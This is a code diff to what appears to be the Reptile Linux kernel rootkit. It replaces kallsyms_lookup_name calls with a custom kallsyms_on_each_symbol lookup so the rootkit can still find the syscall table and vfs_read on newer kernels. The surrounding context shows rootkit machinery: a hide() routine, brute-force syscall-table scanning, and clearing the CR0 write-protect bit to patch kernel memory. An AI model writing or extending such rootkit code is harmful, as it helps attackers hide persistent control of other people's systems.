@@ -113,6 +113,35 @@ struct linux_dirent {
         char            d_name[1];
 };
 
+struct ksym {
+    char *name;
+    unsigned long addr;
+};
+
+int find_ksym(void *data, const char *name, struct module *module, unsigned long address) {
+    struct ksym *ksym = (struct ksym *)data;
+    char *target = ksym->name;
+
+    if (strncmp(target, name, KSYM_NAME_LEN) == 0) {
+        ksym->addr = address;
+        return 1;
+    }
+
+    return 0;
+}
+
+unsigned long get_symbol(char *name) {
+    unsigned long symbol = 0;
+    struct ksym ksym;
+
+    ksym.name = name;
+    ksym.addr = 0;
+    kallsyms_on_each_symbol(&find_ksym, &ksym);
+    symbol = ksym.addr;
+
+    return symbol;
+}
+
 void hide(void) {
 	if(hidden) return;
 
@@ -461,7 +490,7 @@ unsigned long *generic_find_sys_call_table(void){
 	unsigned long int i;
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
-	_sys_close = (unsigned long) kallsyms_lookup_name(SYS_CLOSE);
+	_sys_close = get_symbol(SYS_CLOSE);
 #endif
 
 	for (i = PAGE_OFFSET; i < ULONG_MAX; i += sizeof(void *)) {
@@ -640,7 +669,7 @@ static int __init reptile_init(void) {
 	
 	atomic_set(&read_on, 0);
 	sct = (unsigned long *)find_sys_call_table();
-	if(!sct) sct = (unsigned long *)kallsyms_lookup_name(SYS_CALL_TABLE);
+	if(!sct) sct = (unsigned long *)get_symbol(SYS_CALL_TABLE);
 	if(!sct) sct = (unsigned long *)generic_find_sys_call_table();			
 	if(!sct) return -1;
 	
@@ -670,7 +699,7 @@ static int __init reptile_init(void) {
 	exec(argv);
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 14, 0)
-    	vfs_read_addr = (void *)kallsyms_lookup_name(VFS_READ);
+    	vfs_read_addr = (void *)get_symbol(VFS_READ);
 #endif
 
 	write_cr0(read_cr0() & (~0x10000));
